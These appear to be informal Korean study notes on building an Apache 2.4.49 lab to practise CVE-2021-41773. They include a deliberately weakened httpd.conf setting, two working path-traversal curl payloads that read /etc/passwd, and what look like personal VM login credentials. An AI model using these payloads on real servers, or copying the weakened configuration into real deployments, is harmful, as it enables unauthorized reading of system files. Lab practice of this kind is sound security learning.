# 웹서버 구축 및 CVE 공격 방식 #


우분투: 리눅스의 파생 운영체제(배포판) 중 하나임

WSL(Windows Subsystem for Linux): 윈도우 운영체제에서 별도의 가상 머신 없이 리눅스 OS를 네이티브에 가깝게 실행할 수 있도록 하는 마이크로소프트의 기능임

아파치(Apache HTTP Server): 전세계에서 가장 오래되었고, 가장 널리 쓰이는 웹 서버 **소프트웨어**

\* 현재 컴퓨터에 설치되어 있는 'Ubuntu'는 마이크로소프트 스토어에서 다운받은 앱임, 이걸로 우분투 OS를 WSL 방식으로 윈도우즈에서 열 수 있음
하지만 이 앱을 여러번 실행한다고 해서 OS가 여러개가 열리는 건 아니고 처음에 하나 열면 거기서 OS가 열리지만 다른 앱을 더 열면 지금 열려있는 OS와 연결되는 창구역할만함





지금 내가 하고 싶은 것
이 컴퓨터인 Windosw 위에 가상환경을 올리고 그 위에서 우분투를 2개를 올림, 그리고 하나는 아파치 서버를 열고, 다른 하나는 해당 아파치 서버에 공격을 할 것임


CTF(Capture The Flat): 깃발 빼기, 해킹 방어 대회임
CVE: 취약점


CVE-2021-41773: 2021의 취약점을 나타내는 코드

버그바운티 프로그램은 서비스의 취약점을 조기에 찾아 사용자들에게 안전한 서비스를 제공하기 위한 프로그램



아파치 서버 2.4.49를 열고 해당 서버에 접촉하기


칼리?


희생자 아파치 2.4.49 서버 
공격자: 칼리/vm



1. 리눅스 환경 구성(우분투/디비안)
2. 서버 2개 만들기, 하나는 희생자(아파치 서버), 하나는 공격자 서버
3. 희생자 서버에는 IP 주소로 접근하기


2개의 운영체제 환경에서 한 쪽은 아파치를 설치해서 서버를 아파치의 서버 포트는 10000번으로 열어둠
이때 아파치의 httpd.conf의 Directory의 Require all denied를 granted로 변경

공격 운영체제에서는 희생 서버에 공겨어어억!



아파치 2.4.49에서 httpd.conf 의 

<Directory />
	AllowOverrides none
	Require all denied
</Directory>

여기서 denied -> granted


cd /tmp
wget https://archive.apache.org/dist/httpd/httpd-2.4.49.tar.gz
tar -xvf httpd-2.4.49.tar.gz
cd httpd-2.4.49



# 환경 설정
./configure --prefix=/usr/local/apache2 --enable-mods-shared=all --enable-mpms-shared=all

# 컴파일 (시간이 조금 걸립니다)
make

# 설치
sudo make install





1) Apache 버전 확인
2) Request 전송
ex) curl http://IP(도메인)/경로

[Apache HTTP Server 2.4.49]
curl http://1.1.1.1/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

[Apache HTTP Server 2.4.50]
curl http://1.1.1.1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd



호스트: HostJungWoo
도메인: 
사용자 이름: KimJungWoo
암호: 0258


Full Name: pull
User name: user
pawwsowrd: 0258

우분투 설치 경로
C:\Users\WINS_24\Documents\Virtual Machines\Ubuntu 64-bit



cd ~/httpd-2.4.49


./configure --prefix=/usr/local/apache1 --enable-mods-shared=all --enable-mpms-shared=all



make 
sudo make install


sudo /usr/local/apache2/bin/apachectl start
or
localhost



  
  

# 1. 우분투, 우분투(아파치 2.4.49)

# 2. 서버 2개



















